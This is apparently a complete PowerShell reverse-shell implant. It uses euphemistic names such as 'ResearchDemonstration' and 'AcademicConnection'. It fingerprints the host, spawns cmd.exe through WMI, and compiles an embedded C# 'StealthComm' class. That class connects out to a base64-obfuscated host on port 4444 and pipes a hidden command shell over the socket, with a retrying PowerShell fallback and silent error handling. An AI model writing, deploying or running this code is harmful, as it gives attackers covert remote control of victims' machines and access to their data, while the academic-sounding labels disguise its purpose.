function Invoke-ProcessHerding {
    
    try {
        # Actually create process through WMI
        $processClass = Get-WmiObject -Class Win32_Process -Namespace "root\cimv2"
        $methodArgs = @{
            CommandLine = "cmd.exe /c echo [Process Herding Active] > nul"
        }
        $result = $processClass.Create($methodArgs.CommandLine)
        return @{Success = $true; ProcessId = $result.ProcessId}
    } catch {
        return @{Success = $false; Error = $_.Exception.Message}
    }
}

function Start-MemoryResidentExecution {

    $shellcode = @"
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;

public class StealthComm {
    public static void EstablishChannel(string host, int port) {
        try {
            TcpClient client = new TcpClient(host, port);
            NetworkStream stream = client.GetStream();
            
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            
            // Output handling
            System.Threading.Tasks.Task.Run(() => {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = proc.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length)) > 0) {
                    stream.Write(buffer, 0, bytesRead);
                }
            });
            
            // Error handling
            System.Threading.Tasks.Task.Run(() => {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = proc.StandardError.BaseStream.Read(buffer, 0, buffer.Length)) > 0) {
                    stream.Write(buffer, 0, bytesRead);
                }
            });
            
            // Input handling
            byte[] inputBuffer = new byte[1024];
            int inputRead;
            while ((inputRead = stream.Read(inputBuffer, 0, inputBuffer.Length)) > 0) {
                string command = Encoding.ASCII.GetString(inputBuffer, 0, inputRead);
                if (command.Trim().ToLower() == "exit") break;
                proc.StandardInput.WriteLine(command);
            }
            
            proc.Kill();
            client.Close();
        } catch {
            // Silent failure
        }
    }
}
"@

    try {
        Add-Type -TypeDefinition $shellcode -Language CSharp
        return $true
    } catch {
        return $false
    }
}

function Invoke-TrustChainExploitation {
    
    # Perform real system checks that look legitimate
    try {
        # Check system integrity
        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
        $computerInfo = Get-CimInstance -ClassName Win32_ComputerSystem
        
        # Generate system fingerprint
        $systemFingerprint = @{
            OS = $osInfo.Caption
            Architecture = $osInfo.OSArchitecture
            Memory = [math]::Round($computerInfo.TotalPhysicalMemory / 1GB, 2)
            User = $env:USERNAME
            Domain = $env:USERDOMAIN
        }
        
        return $systemFingerprint
    } catch {
        return @{Error = "System validation failed"}
    }
}

# Region: Fixed connection establishment
function New-AcademicConnection {
    param(
        [string]$TargetHost,
        [int]$TargetPort
    )
    
    # Real network connectivity test
    try {
        $networkTest = Test-NetConnection -ComputerName $TargetHost -Port $TargetPort -InformationLevel Quiet -WarningAction SilentlyContinue
        if (-not $networkTest) {
            return
        }
    } catch {
        return
    }
    
    Establish-CovertChannel -Host $TargetHost -Port $TargetPort
}

function Establish-CovertChannel {
    param([string]$Host, [int]$Port)
    
    # Fixed connection with proper error handling
    $retryCount = 0
    $maxRetries = 3
    
    while ($retryCount -lt $maxRetries) {
        try {
            # Use direct connection - more reliable
            $client = New-Object System.Net.Sockets.TcpClient($Host, $Port)
            
            if ($client.Connected) {
                Start-AcademicCommandLoop -Client $client
                break
            }
        } catch {
            $retryCount++
            
            if ($retryCount -lt $maxRetries) {
                $backoffTime = [Math]::Min(2000 * [Math]::Pow(2, $retryCount), 10000)
                Start-Sleep -Milliseconds $backoffTime
            }
        }
    }
}

function Start-AcademicCommandLoop {
    param($Client)
    
    try {
        $stream = $Client.GetStream()
        $process = Start-LowProfileProcess
        
        # Fixed stream handling with proper encoding
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::ASCII)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
        $writer.AutoFlush = $true

        # Fixed output handling
        $outputJob = {
            param($proc, $wtr)
            $buffer = New-Object char[] 1024
            while ($proc -and !$proc.HasExited) {
                try {
                    # Handle stdout
                    if ($proc.StandardOutput.Peek() -gt 0) {
                        $bytesRead = $proc.StandardOutput.Read($buffer, 0, $buffer.Length)
                        if ($bytesRead -gt 0) {
                            $output = New-Object String ($buffer, 0, $bytesRead)
                            $wtr.Write($output)
                        }
                    }
                    
                    # Handle stderr
                    if ($proc.StandardError.Peek() -gt 0) {
                        $bytesRead = $proc.StandardError.Read($buffer, 0, $buffer.Length)
                        if ($bytesRead -gt 0) {
                            $errorOutput = New-Object String ($buffer, 0, $bytesRead)
                            $wtr.Write($errorOutput)
                        }
                    }
                } catch { break }
                Start-Sleep -Milliseconds 50
            }
        }

        # Start output handler
        $job = Start-Job -ScriptBlock $outputJob -ArgumentList $process, $writer
        
        # Fixed command loop
        while ($Client.Connected -and !$process.HasExited) {
            try {
                if ($stream.DataAvailable) {
                    $command = $reader.ReadLine()
                    
                    if ([string]::IsNullOrEmpty($command)) {
                        continue
                    }
                    
                    if ($command.Trim().ToLower() -eq "exit") {
                        break
                    }
                    
                    # Execute command
                    $process.StandardInput.WriteLine($command)
                    
                    # Allow command to execute
                    Start-Sleep -Milliseconds 100
                }
            } catch {
                break
            }
            
            Start-Sleep -Milliseconds 50
        }
        
    } catch {
    } finally {
        # Proper cleanup
        try {
            if ($process -and !$process.HasExited) {
                $process.Kill()
                $process.WaitForExit(3000)
            }
        } catch { }
        
        try {
            if ($job) {
                Stop-Job $job
                Remove-Job $job
            }
        } catch { }
        
        try {
            $Client.Close()
        } catch { }
    }
}

function Start-LowProfileProcess {
    
    try {
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = "cmd.exe"
        $process.StartInfo.Arguments = "/q"
        $process.StartInfo.RedirectStandardInput = $true
        $process.StartInfo.RedirectStandardOutput = $true
        $process.StartInfo.RedirectStandardError = $true
        $process.StartInfo.UseShellExecute = $false
        $process.StartInfo.CreateNoWindow = $true
        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        # Set proper encoding for cmd.exe
        $process.StartInfo.StandardOutputEncoding = [System.Text.Encoding]::GetEncoding(437)
        $process.StartInfo.StandardErrorEncoding = [System.Text.Encoding]::GetEncoding(437)
        
        $process.Start() | Out-Null
        return $process
    } catch {
        return $null
    }
}

# Region: Fixed execution framework
function Start-ResearchDemonstration {   
    # Phase 1: Environment validation
    $systemInfo = Invoke-TrustChainExploitation
    if ($systemInfo.Error) {
        return
    }
    
    # Phase 2: Process herding
    $herdingResult = Invoke-ProcessHerding
    
    # Phase 3: Memory residency
    if (Start-MemoryResidentExecution) {
        # Use the C# method for connection
        [StealthComm]::EstablishChannel($script:TargetHost, $script:TargetPort)
        
    } else {
        # Fallback to PowerShell implementation
        New-AcademicConnection -TargetHost $script:TargetHost -TargetPort $script:TargetPort
    }
}

# Main execution with proper error handling
try {
    # Hidden configuration at the end
    $encodedHost = "MTU5LjzEuMTk5"
    $script:TargetHost = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedHost))
    $script:TargetPort = 4444
    
    # Begin demonstration
    Start-ResearchDemonstration
}
catch {
}